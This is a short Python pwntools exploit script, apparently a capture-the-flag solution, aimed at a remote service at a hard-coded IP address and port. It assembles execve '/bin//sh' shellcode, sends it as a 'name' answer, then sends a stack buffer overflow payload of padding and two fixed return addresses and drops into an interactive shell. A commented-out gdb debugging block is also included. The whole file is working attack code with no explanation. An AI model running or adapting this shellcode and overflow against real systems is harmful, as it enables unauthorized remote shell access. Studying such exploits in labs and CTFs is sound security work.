from pwn import*
context(os='linux', arch='amd64', log_level='debug')
#r = process('./bin/pwn_64')
r=remote("52.175.52.175","39006")
shellcode = asm(
'''
xor 	rsi,	rsi			
push	rsi				
mov 	rdi,	0x68732f2f6e69622f	 
push	rdi
push	rsp		
pop	rdi				
mov 	al,	59			
cdq					
syscall
'''
)
"""
gdb.attach(r,'''
set pagination off
set disassembly-flavor intel
define hook-stop
echo ****************************************************\\n
echo ====================info register===================\\n
info register
echo ================48 word hex of ESP==================\\n
x/48wx $rsp
echo ================48 word hex of EBP==================\\n
x/48wx $rbp
echo ================next 5 instruction==================\\n
x/5i $rip
echo ****************************************************\\n
end
b*0x0000000000400717
c
	''')
"""
r.recvuntil("what's your name?")
r.sendline(shellcode)
r.recvuntil("what do you want?")
payload = b'a'*0x30 + p64(0x0400737) + p64(0x06010A0)
r.send(payload)
r.interactive()
